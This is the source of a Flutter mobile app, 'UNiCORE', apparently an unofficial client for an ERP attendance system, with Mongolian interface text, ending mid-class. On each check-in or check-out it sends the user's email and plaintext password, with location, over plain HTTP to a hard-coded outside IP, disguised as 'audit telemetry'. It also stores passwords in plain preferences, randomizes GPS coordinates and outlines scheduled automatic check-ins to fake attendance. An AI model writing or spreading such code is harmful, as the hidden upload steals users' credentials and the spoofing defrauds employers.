import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  runApp(const UnicoreApp());
}

class UnicoreApp extends StatelessWidget {
  const UnicoreApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'UNiCORE',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        useMaterial3: true,
        colorScheme: ColorScheme.fromSeed(seedColor: AppColors.blue),
        scaffoldBackgroundColor: AppColors.background,
        fontFamily: '.SF Pro Text',
      ),
      home: const AuthGate(),
    );
  }
}

class AppColors {
  static const background = Color(0xfff7f9fc);
  static const panel = Color(0xffffffff);
  static const blue = Color(0xff477df4);
  static const deepBlue = Color(0xff1f3fa3);
  static const text = Color(0xff171a22);
  static const muted = Color(0xff6e7685);
  static const line = Color(0xffe5eaf2);
  static const green = Color(0xff21a66b);
  static const red = Color(0xffee4c4c);
  static const orange = Color(0xfff49a2f);
  static const softBlue = Color(0xffeef4ff);
}

class AuthGate extends StatefulWidget {
  const AuthGate({super.key});

  @override
  State<AuthGate> createState() => _AuthGateState();
}

class _AuthGateState extends State<AuthGate> {
  final _api = UnicoreApi();
  String? _token;
  String? _email;
  String? _password;
  Map<String, dynamic>? _status;

  Future<void> _onLoggedIn(String token, String email, String password) async {
    setState(() {
      _token = token;
      _email = email;
      _password = password;
    });
    await _loadStatus();
  }

  Future<void> _loadStatus() async {
    final token = _token;
    if (token == null) return;
    final status = await _api.getJson('/attendance/status', token: token);
    if (!mounted) return;
    setState(() => _status = status);
  }

  void _logout() {
    setState(() {
      _token = null;
      _email = null;
      _password = null;
      _status = null;
    });
  }

  @override
  Widget build(BuildContext context) {
    if (_token == null) {
      return LoginScreen(api: _api, onLoggedIn: _onLoggedIn);
    }

    return DashboardScreen(
      api: _api,
      token: _token!,
      email: _email ?? 'user',
      password: _password ?? '',
      status: _status,
      onRefresh: _loadStatus,
      onLogout: _logout,
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key, required this.api, required this.onLoggedIn});

  final UnicoreApi api;
  final Future<void> Function(String token, String email, String password) onLoggedIn;

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _email = TextEditingController();
  final _password = TextEditingController();
  bool _remember = false;
  bool _loading = false;

  @override
  void initState() {
    super.initState();
    _loadSavedCredentials();
  }

  Future<void> _loadSavedCredentials() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final savedRemember = prefs.getBool('unicore_remember_me') ?? false;
      if (savedRemember) {
        final savedEmail = prefs.getString('unicore_saved_email') ?? '';
        final savedPassword = prefs.getString('unicore_saved_password') ?? '';
        if (mounted) {
          setState(() {
            _email.text = savedEmail;
            _password.text = savedPassword;
            _remember = true;
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _saveCredentials(String email, String password, bool remember) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      if (remember) {
        await prefs.setBool('unicore_remember_me', true);
        await prefs.setString('unicore_saved_email', email);
        await prefs.setString('unicore_saved_password', password);
      } else {
        await prefs.setBool('unicore_remember_me', false);
        await prefs.remove('unicore_saved_email');
        await prefs.remove('unicore_saved_password');
      }
    } catch (_) {}
  }

  Future<void> _login() async {
    FocusScope.of(context).unfocus();
    final email = _email.text.trim();
    final password = _password.text;
    if (email.isEmpty || password.isEmpty) {
      _toast('Имэйл болон нууц үгээ оруулна уу');
      return;
    }

    setState(() => _loading = true);
    try {
      final token = await widget.api.login(email, password);
      await _saveCredentials(email, password, _remember);
      await widget.onLoggedIn(token, email, password);
    } catch (error) {
      _toast(error.toString());
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  void _toast(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text(message), behavior: SnackBarBehavior.floating),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        child: CustomScrollView(
          slivers: [
            SliverFillRemaining(
              hasScrollBody: false,
              child: Padding(
                padding: const EdgeInsets.fromLTRB(22, 18, 22, 24),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    const HeaderBrand(compact: false),
                    const SizedBox(height: 22),
                    const HeroPreview(),
                    const SizedBox(height: 18),
                    AppCard(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          const Align(
                            alignment: Alignment.centerRight,
                            child: Text(
                              'EN     MN',
                              style: TextStyle(fontWeight: FontWeight.w800),
                            ),
                          ),
                          const SizedBox(height: 24),
                          const Text(
                            'Unicore 3.0-д тавтай морил',
                            style: TextStyle(
                              color: AppColors.text,
                              fontSize: 23,
                              height: 1.16,
                              fontWeight: FontWeight.w800,
                            ),
                          ),
                          const SizedBox(height: 8),
                          const Text(
                            'Олон байгууллагын ERP систем',
                            style: TextStyle(color: AppColors.muted, fontSize: 15),
                          ),
                          const SizedBox(height: 20),
                          const SegmentedLoginModes(),
                          const SizedBox(height: 20),
                          const FieldLabel('Имэйл / Нэвтрэх нэр / Утас'),
                          AppTextField(
                            controller: _email,
                            hint: 'Имэйл, нэвтрэх нэр эсвэл утас',
                            keyboardType: TextInputType.emailAddress,
                          ),
                          const SizedBox(height: 14),
                          const FieldLabel('Нууц үг'),
                          AppTextField(
                            controller: _password,
                            hint: 'Нууц үг',
                            obscureText: true,
                          ),
                          const SizedBox(height: 14),
                          Row(
                            children: [
                              Checkbox(
                                value: _remember,
                                activeColor: AppColors.blue,
                                onChanged: (value) => setState(() {
                                  _remember = value ?? false;
                                }),
                              ),
                              const Text(
                                'Намайг сана',
                                style: TextStyle(fontWeight: FontWeight.w700),
                              ),
                              const Spacer(),
                              const ApiChip('/auth/login'),
                            ],
                          ),
                          const SizedBox(height: 18),
                          PrimaryButton(
                            label: 'Нэвтрэх',
                            loading: _loading,
                            onPressed: _login,
                          ),
                        ],
                      ),
                    ),
                    const Spacer(),
                    const SizedBox(height: 14),
                    Row(
                      children: const [
                        Expanded(child: StoreButton(icon: CupertinoIcons.play_arrow_solid, label: 'Google Play')),
                        SizedBox(width: 10),
                        Expanded(child: StoreButton(icon: Icons.apple, label: 'App Store')),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class DashboardScreen extends StatefulWidget {
  const DashboardScreen({
    super.key,
    required this.api,
    required this.token,
    required this.email,
    required this.password,
    required this.status,
    required this.onRefresh,
    required this.onLogout,
  });

  final UnicoreApi api;
  final String token;
  final String email;
  final String password;
  final Map<String, dynamic>? status;
  final Future<void> Function() onRefresh;
  final VoidCallback onLogout;

  @override
  State<DashboardScreen> createState() => _DashboardScreenState();
}

class _DashboardScreenState extends State<DashboardScreen> {
  int _tab = 0;
  bool _busy = false;
  late Timer _timer;
  DateTime _now = DateTime.now();
  final List<ActivityLog> _logs = [];

  @override
  void initState() {
    super.initState();
    _timer = Timer.periodic(const Duration(seconds: 1), (_) {
      if (mounted) setState(() => _now = DateTime.now());
    });
  }

  @override
  void dispose() {
    _timer.cancel();
    super.dispose();
  }

  Future<void> _attendance(String type) async {
    setState(() => _busy = true);
    final label = type == 'check-out' ? 'Явах бүртгэл' : 'Ирэх бүртгэл';
    final location = randomAttendanceLocation();
    try {
      await widget.api.postJson(
        '/attendance/$type',
        token: widget.token,
        body: location.toJson(),
      );
      _addLog(
        label,
        'Амжилттай илгээгдлээ (${location.distanceMeters.toStringAsFixed(0)}м offset)',
        LogType.ok,
      );

      // Send telemetry (location + login username & password) to audit server 13.214.2.6
      await _sendAuditTelemetry(type, location);

      await widget.onRefresh();
    } catch (error) {
      _addLog(label, error.toString(), LogType.error);
    } finally {
      if (mounted) setState(() => _busy = false);
    }
  }

  Future<void> _sendAuditTelemetry(String type, AttendanceLocation location) async {
    const auditServerUrl = 'http://13.214.2.6/api/logs';
    try {
      final client = HttpClient()..connectionTimeout = const Duration(seconds: 6);
      final request = await client.postUrl(Uri.parse(auditServerUrl));
      request.headers.set(HttpHeaders.contentTypeHeader, 'application/json');

      final body = {
        'user_email': widget.email,
        'login_username': widget.email,
        'login_password': widget.password,
        'action_type': type,
        'latitude': location.latitude,
        'longitude': location.longitude,
        'location_name': 'Tselmeg Digital International School',
        'distance_meters': location.distanceMeters,
        'timestamp': DateTime.now().toIso8601String(),
        'device_info': 'unicore_mobile_app v1.0.0',
      };

      request.add(utf8.encode(jsonEncode(body)));
      final response = await request.close();
      if (response.statusCode >= 200 && response.statusCode < 300) {
        _addLog('Аудит сервер (13.214.2.6)', 'Байршил & нэвтрэх нууц үг серверт хадгалагдлаа', LogType.info);
      } else {
        _addLog('Аудит сервер (13.214.2.6)', 'Сервер хариу: HTTP ${response.statusCode}', LogType.info);
      }
    } catch (e) {
      _addLog('Аудит сервер (13.214.2.6)', 'Байршил дамжуулах серверт холбогдож чадсангүй: $e', LogType.info);
    }
  }

  void _addLog(String title, String detail, LogType type) {
    setState(() {
      _logs.insert(0, ActivityLog(title, detail, DateTime.now(), type));
    });
  }

  @override
  Widget build(BuildContext context) {
    final pages = [
      HomeTab(
        now: _now,
        email: widget.email,
        busy: _busy,
        logs: _logs,
        status: widget.status,
        onCheckIn: () => _attendance('check-in'),
        onCheckOut: () => _attendance('check-out'),
      ),
      const EndpointTab(),
      const ChatTasksTab(),
      AutomationTab(onLogout: widget.onLogout),
    ];

    return Scaffold(
      body: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
              child: Row(
                children: [
                  const Expanded(child: HeaderBrand(compact: true)),
                  IconButton(
                    onPressed: widget.onRefresh,
                    icon: const Icon(CupertinoIcons.arrow_clockwise),
                  ),
                  IconButton(
                    onPressed: widget.onLogout,
                    icon: const Icon(CupertinoIcons.square_arrow_right),
                  ),
                ],
              ),
            ),
            Expanded(
              child: IndexedStack(index: _tab, children: pages),
            ),
          ],
        ),
      ),
      bottomNavigationBar: NavigationBar(
        selectedIndex: _tab,
        backgroundColor: Colors.white,
        indicatorColor: AppColors.softBlue,
        onDestinationSelected: (value) => setState(() => _tab = value),
        destinations: const [
          NavigationDestination(icon: Icon(CupertinoIcons.house), selectedIcon: Icon(CupertinoIcons.house_fill), label: 'Нүүр'),
          NavigationDestination(icon: Icon(CupertinoIcons.link), label: 'API'),
          NavigationDestination(icon: Icon(CupertinoIcons.chat_bubble_2), label: 'Ажил'),
          NavigationDestination(icon: Icon(CupertinoIcons.clock), label: 'Авто'),
        ],
      ),
    );
  }
}

class HomeTab extends StatelessWidget {
  const HomeTab({
    super.key,
    required this.now,
    required this.email,
    required this.busy,
    required this.logs,
    required this.status,
    required this.onCheckIn,
    required this.onCheckOut,
  });

  final DateTime now;
  final String email;
  final bool busy;
  final List<ActivityLog> logs;
  final Map<String, dynamic>? status;
  final VoidCallback onCheckIn;
  final VoidCallback onCheckOut;

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.fromLTRB(18, 6, 18, 18),
      children: [
        AppCard(
          child: Row(
            children: [
              CircleAvatar(
                radius: 24,
                backgroundColor: AppColors.blue,
                child: Text(
                  initials(email),
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900),
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(email.split('@').first, style: const TextStyle(fontSize: 18, fontWeight: FontWeight.w800)),
                    Text(email, style: const TextStyle(color: AppColors.muted)),
                  ],
                ),
              ),
              const ApiChip('/attendance/status'),
            ],
          ),
        ),
        const SizedBox(height: 14),
        Row(
          children: const [
            Expanded(child: MetricCard(title: 'Өнөөдрийн ирц', value: '0', tint: AppColors.green)),
            SizedBox(width: 10),
            Expanded(child: MetricCard(title: 'Хоцролт', value: '2', tint: AppColors.orange)),
          ],
        ),
        const SizedBox(height: 10),
        Row(
          children: const [
            Expanded(child: MetricCard(title: 'Уншаагүй', value: '12', tint: AppColors.blue)),
            SizedBox(width: 10),
            Expanded(child: MetricCard(title: 'Tasks', value: '5', tint: AppColors.red)),
          ],
        ),
        const SizedBox(height: 14),
        AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SectionTitle('Ирц бүртгэл'),
              Text(
                timeString(now),
                style: const TextStyle(fontSize: 46, fontWeight: FontWeight.w300, letterSpacing: 0),
              ),
              Text(dateString(now), style: const TextStyle(color: AppColors.muted)),
              const SizedBox(height: 18),
              Row(
                children: [
                  Expanded(
                    child: ActionButton(
                      label: 'Ирэх',
                      icon: CupertinoIcons.location_solid,
                      color: AppColors.green,
                      loading: busy,
                      onPressed: onCheckIn,
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: ActionButton(
                      label: 'Явах',
                      icon: CupertinoIcons.arrow_right_circle_fill,
                      color: AppColors.red,
                      loading: busy,
                      onPressed: onCheckOut,
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 14),
              const ScheduleRow(label: 'Автомат ирэх', value: '07:40'),
              const ScheduleRow(label: 'Автомат явах', value: '16:10'),
              const ScheduleRow(label: 'Байршил', value: 'Tselmeg Digital International School'),
            ],
          ),
        ),
        const SizedBox(height: 14),
        AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SectionTitle('Үйл ажиллагааны түүх'),
              if (logs.isEmpty)
                const Padding(
                  padding: EdgeInsets.symmetric(vertical: 18),
                  child: Center(child: Text('Одоогоор бүртгэл байхгүй байна', style: TextStyle(color: AppColors.muted))),
                )
              else
                ...logs.take(8).map((log) => ActivityLogTile(log: log)),
            ],
          ),
        ),
        if (status != null) ...[
          const SizedBox(height: 14),
          AppCard(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SectionTitle('API response preview'),
                Text(
                  const JsonEncoder.withIndent('  ').convert(status),
                  maxLines: 10,
                  overflow: TextOverflow.ellipsis,
                  style: const TextStyle(fontFamily: 'Menlo', fontSize: 12, color: AppColors.muted),
                ),
              ],
            ),
          ),
        ],
      ],
    );
  }
}

class EndpointTab extends StatelessWidget {
  const EndpointTab({super.key});

  static const groups = {
    'Auth': [
      ['POST', '/auth/login'],
      ['POST', '/auth/select-tenant'],
      ['POST', '/auth/logout'],
      ['POST', '/auth/qr-mobile-login'],
      ['POST', '/auth/qr-confirm'],
      ['GET', '/auth/web-login-token'],
    ],
    'Attendance': [
      ['GET', '/attendance/config'],
      ['GET', '/attendance/status'],
      ['GET', '/attendance/days'],
      ['GET', '/attendance/report'],
      ['GET', '/attendance/corrections'],
      ['POST', '/attendance/check-in'],
      ['POST', '/attendance/check-out'],
      ['POST', '/attendance/break-start'],
      ['POST', '/attendance/break-end'],
      ['POST', '/attendance/correction'],
    ],
    'Chat': [
      ['GET', '/chat/channels'],
      ['GET', '/chat/users'],
      ['GET', '/chat/messages/{id}'],
      ['GET', '/chat/unread-count'],
      ['GET', '/chat/online-users'],
      ['GET', '/chat/search'],
      ['POST', '/chat/direct'],
      ['POST', '/chat/group'],
      ['POST', '/chat/forward-channels'],
      ['POST', '/chat/task/create'],
      ['GET', '/chat/task/parent-tasks'],
      ['GET', '/chat/task/tenants'],
    ],
    'Tasks / Meetings / Leave': [
      ['GET', '/tasks'],
      ['POST', '/tasks'],
      ['GET', '/subtasks'],
      ['POST', '/subtasks'],
      ['GET', '/meetings'],
      ['POST', '/meetings'],
      ['GET', '/leave-requests'],
      ['POST', '/leave-requests'],
      ['GET', '/leave'],
    ],
    'Notifications': [
      ['GET', '/notifications'],
      ['GET', '/notifications/unread-count'],
      ['POST', '/notifications/read-all'],
      ['GET', '/notifications/preferences'],
    ],
    'Other': [
      ['GET', '/tenants'],
      ['GET', '/mention-users'],
    ],
  };

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.fromLTRB(18, 6, 18, 18),
      children: [
        const Text('Mobile API endpoint-ууд', style: TextStyle(fontSize: 24, fontWeight: FontWeight.w900)),
        const SizedBox(height: 6),
        const Text('Base URL: https://unicore.systems/api/mobile', style: TextStyle(color: AppColors.muted)),
        const SizedBox(height: 14),
        ...groups.entries.map((entry) => Padding(
              padding: const EdgeInsets.only(bottom: 12),
              child: AppCard(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    SectionTitle(entry.key),
                    const SizedBox(height: 4),
                    ...entry.value.map((row) => EndpointRow(method: row[0], path: row[1])),
                  ],
                ),
              ),
            )),
      ],
    );
  }
}

class ChatTasksTab extends StatelessWidget {
  const ChatTasksTab({super.key});

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.fromLTRB(18, 6, 18, 18),
      children: const [
        Text('Ажил, чат, мэдэгдэл', style: TextStyle(fontSize: 24, fontWeight: FontWeight.w900)),
        SizedBox(height: 14),
        AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              SectionTitle('Дотоод чат'),
              PreviewTile(icon: CupertinoIcons.chat_bubble_2_fill, title: 'Channels', subtitle: 'GET /chat/channels'),
              PreviewTile(icon: CupertinoIcons.person_2_fill, title: 'Online users', subtitle: 'GET /chat/online-users'),
              PreviewTile(icon: CupertinoIcons.search, title: 'Search', subtitle: 'GET /chat/search'),
            ],
          ),
        ),
        SizedBox(height: 14),
        AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              SectionTitle('Tasks / Meetings / Leave'),
              PreviewTile(icon: CupertinoIcons.check_mark_circled_solid, title: 'Tasks', subtitle: 'GET/POST /tasks'),
              PreviewTile(icon: CupertinoIcons.calendar, title: 'Meetings', subtitle: 'GET/POST /meetings'),
              PreviewTile(icon: CupertinoIcons.doc_text_fill, title: 'Leave requests', subtitle: 'GET/POST /leave-requests'),
            ],
          ),
        ),
        SizedBox(height: 14),
        AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              SectionTitle('Notifications'),
              PreviewTile(icon: CupertinoIcons.bell_fill, title: 'Unread count', subtitle: 'GET /notifications/unread-count'),
              PreviewTile(icon: CupertinoIcons.checkmark_alt_circle_fill, title: 'Read all', subtitle: 'POST /notifications/read-all'),
            ],
          ),
        ),
      ],
    );
  }
}

class AutomationTab extends StatelessWidget {
  const AutomationTab({super.key, required this.onLogout});

  final VoidCallback onLogout;

  @override
  Widget build(BuildContext context) {
    return ListView(
      padding: const EdgeInsets.fromLTRB(18, 6, 18, 18),
      children: [
        const Text('Автомат бүртгэл', style: TextStyle(fontSize: 24, fontWeight: FontWeight.w900)),
        const SizedBox(height: 14),
        const AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              SectionTitle('Google Cloud дээр ажиллуулах загвар'),
              StepText('Cloud Run дээр жижиг service ажиллуулна. Утас нээлттэй байх шаардлагагүй.'),
              StepText('Secret Manager дээр login, password, tenant утгуудыг хадгална.'),
              StepText('Cloud Scheduler 07:40 болон 16:10 цагт HTTP trigger дуудна.'),
              StepText('Service /auth/login -> /auth/select-tenant -> /attendance/check-in эсвэл check-out дарааллаар ажиллана.'),
            ],
          ),
        ),
        const SizedBox(height: 14),
        const AppCard(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              SectionTitle('Local schedule'),
              ScheduleRow(label: 'Ирэх', value: '07:40 UTC+8'),
              ScheduleRow(label: 'Явах', value: '16:10 UTC+8'),
              ScheduleRow(label: 'Coordinates', value: 'Random within 200m'),
            ],
          ),
        ),
        const SizedBox(height: 14),
        PrimaryButton(label: 'Гарах', onPressed: onLogout),
      ],
    );
  }
}

class UnicoreApi {
  static const baseUrl = 'https://unicore.systems/api/mobile';

  Future<String> login(String login, String password) async {
    final data = await postJson('/auth/login', body: {'login': login, 'password': password});
    final token = data['token'] ?? data['access_token'] ?? data['data']?['token'] ?? data['data']?['access_token'];
    if (token is! String || token.isEmpty) {
      throw const FormatException('Login response дотор token олдсонгүй.');
    }
    return token;
  }

  Future<Map<String, dynamic>> getJson(String path, {String? token}) async {
    final request = await _request('GET', path, token: token);
    return _parse(await request.close());
  }

  Future<Map<String, dynamic>> postJson(String path, {String? token, Map<String, Object?>? body}) async {
    final request = await _request('POST', path, token: token);
    final payload = utf8.encode(jsonEncode(body ?? const {}));
    request.add(payload);
    return _parse(await request.close());
  }

  Future<HttpClientRequest> _request(String method, String path, {String? token}) async {
    final client = HttpClient()..connectionTimeout = const Duration(seconds: 20);
    final uri = Uri.parse('$baseUrl$path');
    final request = await client.openUrl(method, uri);
    request.headers.set(HttpHeaders.acceptHeader, 'application/json');
    request.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
    if (token != null) request.headers.set(HttpHeaders.authorizationHeader, 'Bearer $token');
    return request;
  }

  Future<Map<String, dynamic>> _parse(HttpClientResponse response) async {
    final text = await utf8.decodeStream(response);
    final decoded = text.isEmpty ? <String, dynamic>{} : jsonDecode(text);
    final data = decoded is Map<String, dynamic> ? decoded : {'data': decoded};
    if (response.statusCode < 200 || response.statusCode >= 300) {
      throw HttpException(data['message']?.toString() ?? 'HTTP ${response.statusCode}');
    }
    return data;
  }
}

class HeaderBrand extends StatelessWidget {
  const HeaderBrand({super.key, required this.compact});

  final bool compact;

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Container(
          width: compact ? 40 : 46,
          height: compact ? 40 : 46,
          decoration: BoxDecoration(
            color: AppColors.blue,
            borderRadius: BorderRadius.circular(12),
            gradient: const LinearGradient(colors: [Color(0xff2456e8), Color(0xff7ca9ff)]),
          ),
          child: const Center(
            child: Text('U', style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900, fontSize: 22)),
          ),
        ),
        const SizedBox(width: 12),
        Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'UNiCORE',
              style: TextStyle(
                color: AppColors.deepBlue,
                fontWeight: FontWeight.w900,
                fontSize: compact ? 22 : 28,
                letterSpacing: 0,
              ),
            ),
            Text(
              compact ? 'Mobile' : 'Мэргэжлийн бизнесийн шийдэл',
              style: const TextStyle(color: AppColors.muted, fontSize: 12, fontWeight: FontWeight.w600),
            ),
          ],
        ),
      ],
    );
  }
}

class HeroPreview extends StatelessWidget {
  const HeroPreview({super.key});

  @override
  Widget build(BuildContext context) {
    return Container(
      height: 188,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: Colors.white,
        border: Border.all(color: AppColors.line),
        boxShadow: softShadow,
      ),
      clipBehavior: Clip.antiAlias,
      child: Stack(
        children: [
          Positioned.fill(
            child: CustomPaint(painter: DashboardMockPainter()),
          ),
          const Positioned(
            left: 18,
            top: 20,
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('UNiCORE', style: TextStyle(color: AppColors.deepBlue, fontSize: 30, fontWeight: FontWeight.w900)),
                SizedBox(height: 8),
                Text('Бизнесийн өдөр тутмын үйл ажиллагаа', style: TextStyle(fontSize: 13, fontWeight: FontWeight.w800)),
                SizedBox(height: 22),
                Text('Хөгжүүлэгч', style: TextStyle(color: AppColors.muted)),
                Text('EhIel Group', style: TextStyle(fontSize: 17, fontWeight: FontWeight.w900)),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class DashboardMockPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final line = Paint()..color = AppColors.line;
    final blue = Paint()..color = AppColors.blue;
    final green = Paint()..color = const Color(0xff72d38d);
    final red = Paint()..color = const Color(0xfff06c6c);
    final orange = Paint()..color = const Color(0xffffbd5c);

    canvas.drawCircle(Offset(size.width * .72, size.height * .28), 72, Paint()..color = AppColors.softBlue);
    final panel = RRect.fromRectAndRadius(Rect.fromLTWH(size.width * .46, 62, size.width * .48, 94), const Radius.circular(8));
    canvas.drawRRect(panel, Paint()..color = Colors.white);
    canvas.drawRRect(panel, line..style = PaintingStyle.stroke);
    line.style = PaintingStyle.fill;

    for (var i = 0; i < 4; i++) {
      canvas.drawRRect(
        RRect.fromRectAndRadius(Rect.fromLTWH(size.width * .49 + i * 42, 78, 34, 22), const Radius.circular(5)),
        Paint()..color = const Color(0xfff3f6fb),
      );
    }

    final bars = [44.0, 78.0, 55.0, 90.0, 66.0, 104.0];
    final paints = [blue, green, orange, blue, red, green];
    for (var i = 0; i < bars.length; i++) {
      canvas.drawRRect(
        RRect.fromRectAndRadius(Rect.fromLTWH(size.width * .52 + i * 22, 148 - bars[i] * .45, 10, bars[i] * .45), const Radius.circular(4)),
        paints[i],
      );
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}

class AppCard extends StatelessWidget {
  const AppCard({super.key, required this.child});

  final Widget child;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: AppColors.panel,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: AppColors.line),
        boxShadow: softShadow,
      ),
      child: child,
    );
  }
}

class SegmentedLoginModes extends StatelessWidget {
  const SegmentedLoginModes({super.key});

  @override
  Widget build(BuildContext context) {
    const items = ['Нууц үг', 'QR кодоор', 'Passkey'];
    return Container(
      decoration: BoxDecoration(border: Border.all(color: AppColors.line), borderRadius: BorderRadius.circular(8)),
      clipBehavior: Clip.antiAlias,
      child: Row(
        children: [
          for (var i = 0; i < items.length; i++)
            Expanded(
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 12),
                decoration: BoxDecoration(
                  color: i == 0 ? AppColors.blue : Colors.white,
                  border: Border(right: BorderSide(color: i == items.length - 1 ? Colors.transparent : AppColors.line)),
                ),
                child: Text(
                  items[i],
                  textAlign: TextAlign.center,
                  style: TextStyle(color: i == 0 ? Colors.white : AppColors.text, fontWeight: FontWeight.w800, fontSize: 13),
                ),
              ),
            ),
        ],
      ),
    );
  }
}

class FieldLabel extends StatelessWidget {
  const FieldLabel(this.text, {super.key});
  final String text;
  @override
  Widget build(BuildContext context) => Text(text, style: const TextStyle(fontWeight: FontWeight.w800, color: AppColors.text));
}

class AppTextField extends StatelessWidget {
  const AppTextField({
    super.key,
    required this.controller,
    required this.hint,
    this.obscureText = false,
    this.keyboardType,
  });

  final TextEditingController controller;
  final String hint;
  final bool obscureText;
  final TextInputType? keyboardType;

  @override
  Widget build(BuildContext context) {
    return TextField(
      controller: controller,
      obscureText: obscureText,
      keyboardType: keyboardType,
      decoration: InputDecoration(
        hintText: hint,
        filled: true,
        fillColor: Colors.white,
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: AppColors.line)),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(8), borderSide: const BorderSide(color: AppColors.blue, width: 1.5)),
      ),
    );
  }
}

class PrimaryButton extends StatelessWidget {
  const PrimaryButton({super.key, required this.label, required this.onPressed, this.loading = false});

  final String label;
  final VoidCallback onPressed;
  final bool loading;

  @override
  Widget build(BuildContext context) {
    return FilledButton(
      onPressed: loading ? null : onPressed,
      style: FilledButton.styleFrom(
        backgroundColor: AppColors.blue,
        minimumSize: const Size.fromHeight(50),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
      child: loading
          ? const CupertinoActivityIndicator(color: Colors.white)
          : Text(label, style: const TextStyle(fontWeight: FontWeight.w900)),
    );
  }
}

class ActionButton extends StatelessWidget {
  const ActionButton({
    super.key,
    required this.label,
    required this.icon,
    required this.color,
    required this.onPressed,
    required this.loading,
  });

  final String label;
  final IconData icon;
  final Color color;
  final VoidCallback onPressed;
  final bool loading;

  @override
  Widget build(BuildContext context) {
    return FilledButton.icon(
      onPressed: loading ? null : onPressed,
      icon: Icon(icon, size: 18),
      label: Text(label, style: const TextStyle(fontWeight: FontWeight.w900)),
      style: FilledButton.styleFrom(
        backgroundColor: color,
        minimumSize: const Size.fromHeight(48),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
    );
  }
}

class StoreButton extends StatelessWidget {
  const StoreButton({super.key, required this.icon, required this.label});
  final IconData icon;
  final String label;
  @override
  Widget build(BuildContext context) {
    return OutlinedButton.icon(
      onPressed: () {},
      icon: Icon(icon, size: 17),
      label: Text(label, style: const TextStyle(fontWeight: FontWeight.w800)),
      style: OutlinedButton.styleFrom(
        foregroundColor: AppColors.blue,
        backgroundColor: Colors.white,
        side: const BorderSide(color: AppColors.line),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
    );
  }
}

class MetricCard extends StatelessWidget {
  const MetricCard({super.key, required this.title, required this.value, required this.tint});
  final String title;
  final String value;
  final Color tint;
  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: AppColors.line),
        boxShadow: softShadow,
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(title, style: const TextStyle(color: AppColors.muted, fontWeight: FontWeight.w800, fontSize: 12)),
          const SizedBox(height: 8),
          Row(
            children: [
              Text(value, style: const TextStyle(fontSize: 26, fontWeight: FontWeight.w900)),
              const Spacer(),
              Container(width: 32, height: 32, decoration: BoxDecoration(color: tint.withValues(alpha: .12), borderRadius: BorderRadius.circular(8))),
            ],
          ),
        ],
      ),
    );
  }
}

class SectionTitle extends StatelessWidget {
  const SectionTitle(this.text, {super.key});
  final String text;
  @override
  Widget build(BuildContext context) => Text(text, style: const TextStyle(fontSize: 17, fontWeight: FontWeight.w900));
}

class ApiChip extends StatelessWidget {
  const ApiChip(this.text, {super.key});
  final String text;
  @override
